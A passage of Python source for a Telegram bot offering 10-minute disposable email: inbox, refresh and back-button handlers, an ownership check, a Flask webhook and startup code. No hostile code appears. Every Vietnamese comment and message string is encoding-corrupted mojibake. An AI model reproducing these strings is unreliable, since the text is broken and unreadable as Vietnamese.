def check_mail_owner(call, expected_user_id):
    """Ki·ªÉm tra xem ng∆∞·ªùi nh·∫•n n√∫t c√≥ ph·∫£i l√† ng∆∞·ªùi ƒë√£ t·∫°o mail kh√¥ng."""
    # Chuy·ªÉn expected_user_id sang int ƒë·ªÉ so s√°nh ch√≠nh x√°c
    if call.from_user.id != int(expected_user_id):
        bot.answer_callback_query(call.id, "üö´ Chat Ri√™ng V·ªõi Bot ƒê·ªÉ D√πng Ch·ª©c NƒÉng Mail10p .", show_alert=True)
        return False
    return True

@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_inbox|"))
def show_inbox_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return

    bot.answer_callback_query(call.id, "ƒêang t·∫£i h·ªôp th∆∞...", show_alert=False)

    text, markup, parse_mode = _get_inbox_content(user_id)

    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
            # C·∫≠p nh·∫≠t tr·∫°ng th√°i tin nh·∫Øn
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'inbox'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (inbox).")
        else:
            logging.error(f"L·ªói khi ch·ªânh s·ª≠a tin nh·∫Øn th√†nh h·ªôp th∆∞ cho user {user_id}: {e}")
            # N·∫øu edit kh√¥ng th√†nh c√¥ng, th·ª≠ g·ª≠i tin nh·∫Øn m·ªõi
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            # X√≥a tr·∫°ng th√°i c≈© v√† th√™m tr·∫°ng th√°i m·ªõi
            with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "‚ùå ƒê√£ c√≥ l·ªói khi c·∫≠p nh·∫≠t h·ªôp th∆∞. ƒê√¢y l√† tin nh·∫Øn m·ªõi.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
            
    except Exception as e:
        logging.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi xem h·ªôp th∆∞: {e}")
        bot.answer_callback_query(call.id, "‚ö†Ô∏è L·ªói khi xem h·ªôp th∆∞!", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_refresh|"))
def refresh_inbox_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return

    bot.answer_callback_query(call.id, "ƒêang l√†m m·ªõi h·ªôp th∆∞...", show_alert=False)

    text, markup, parse_mode = _get_inbox_content(user_id)

    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
            # C·∫≠p nh·∫≠t tr·∫°ng th√°i tin nh·∫Øn
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'inbox'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (refresh inbox).")
        else:
            logging.error(f"L·ªói khi l√†m m·ªõi h·ªôp th∆∞ cho user {user_id}: {e}")
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
                # X√≥a tr·∫°ng th√°i c≈© v√† th√™m tr·∫°ng th√°i m·ªõi
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "‚ùå ƒê√£ c√≥ l·ªói khi l√†m m·ªõi h·ªôp th∆∞. ƒê√¢y l√† tin nh·∫Øn m·ªõi.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
    except Exception as e:
        logging.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi l√†m m·ªõi h·ªôp th∆∞: {e}")
        bot.answer_callback_query(call.id, "‚ö†Ô∏è L·ªói khi l√†m m·ªõi h·ªôp th∆∞!", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_back|"))
def back_to_mail_info_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return
    
    bot.answer_callback_query(call.id, "Quay l·∫°i th√¥ng tin mail...", show_alert=False)

    with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data
        info = user_data.get(user_id)

    if not info:
        text = "<i>‚ùå B·∫°n ch∆∞a t·∫°o email. G√µ /mail10p ƒë·ªÉ t·∫°o nh√©!</i>"
        markup = None
        parse_mode = 'HTML'
    else:
        elapsed_time = int(time.time() - info["created_at"])
        remaining_time = 600 - elapsed_time
        if remaining_time > 0:
            minutes = remaining_time // 60
            seconds = remaining_time % 60
            text = (
                f"<blockquote>‚úÖ Mail 10 ph√∫t c·ªßa b·∫°n l√†:\n"
                f"<code>üìß {info['email']}</code>\n"
                f"‚è∞ H·∫øt h·∫°n sau {minutes} ph√∫t {seconds} gi√¢y.</blockquote>"
            )
            markup = build_mail_buttons(user_id, 'mail_info')
            parse_mode = 'HTML'
        else:
            with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data khi x√≥a
                del user_data[user_id]
            text = "‚è∞ Mail 10 ph√∫t c·ªßa b·∫°n ƒë√£ h·∫øt h·∫°n! Vui l√≤ng t·∫°o mail m·ªõi b·∫±ng l·ªánh /mail10p."
            markup = None
            parse_mode = 'HTML'
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
            # C·∫≠p nh·∫≠t tr·∫°ng th√°i tin nh·∫Øn
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'mail_info'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (back to mail info).")
        else:
            logging.error(f"L·ªói khi ch·ªânh s·ª≠a tin nh·∫Øn v·ªÅ th√¥ng tin mail cho user {user_id}: {e}")
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
                # X√≥a tr·∫°ng th√°i c≈© v√† th√™m tr·∫°ng th√°i m·ªõi
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "‚ùå ƒê√£ c√≥ l·ªói khi quay l·∫°i th√¥ng tin mail. ƒê√¢y l√† tin nh·∫Øn m·ªõi.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
    except Exception as e:
        logging.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi quay l·∫°i th√¥ng tin mail: {e}")
        bot.answer_callback_query(call.id, "‚ö†Ô∏è L·ªói khi quay l·∫°i th√¥ng tin mail!", show_alert=True)

# === Webhook Flask ===
@app.route("/")
def index():
    """Trang ch·ªß ƒë∆°n gi·∫£n cho bi·∫øt bot ƒëang ho·∫°t ƒë·ªông."""
    return "<h3>üõ∞Ô∏è ZProject Bot ƒëang ho·∫°t ƒë·ªông!</h3>"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    """ƒêi·ªÉm cu·ªëi webhook ƒë·ªÉ nh·∫≠n c·∫≠p nh·∫≠t t·ª´ Telegram."""
    try:
        # X·ª≠ l√Ω update trong m·ªôt lu·ªìng ri√™ng n·∫øu bot ƒë∆∞·ª£c kh·ªüi t·∫°o v·ªõi threaded=True
        update = telebot.types.Update.de_json(request.data.decode("utf-8"))
        bot.process_new_updates([update]) # Khi threaded=True, m·ªói update s·∫Ω sinh ra m·ªôt lu·ªìng ri√™ng
        return "OK", 200
    except Exception as e:
        logging.error(f"L·ªói webhook: {e}")
        return "Error", 500


# === Kh·ªüi ch·∫°y Bot ===
if __name__ == "__main__":
    try:
        bot_proxy_queue, bot_num_threads = init_proxy()
        webhook_info = bot.get_webhook_info()
        current_webhook_url = f"{APP_URL}/{TOKEN}"
        if webhook_info.url != current_webhook_url:
            logging.info(f"Webhook hi·ªán t·∫°i ({webhook_info.url}) kh√¥ng kh·ªõp v·ªõi URL mong mu·ªën ({current_webhook_url}). ƒêang x√≥a v√† ƒë·∫∑t l·∫°i webhook.")
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=current_webhook_url)
            logging.info(f"Webhook ƒë√£ ƒë∆∞·ª£c ƒë·∫∑t t·ªõi: {current_webhook_url}")
        else:
            logging.info(f"Webhook ƒë√£ ƒë∆∞·ª£c ƒë·∫∑t ch√≠nh x√°c t·ªõi: {current_webhook_url}")

        port = int(os.environ.get("PORT", 10000))
        app.run(host="0.0.0.0", port=port)
    except Exception as e:
        logging.critical(f"L·ªói nghi√™m tr·ªçng khi kh·ªüi ƒë·ªông bot: {e}")

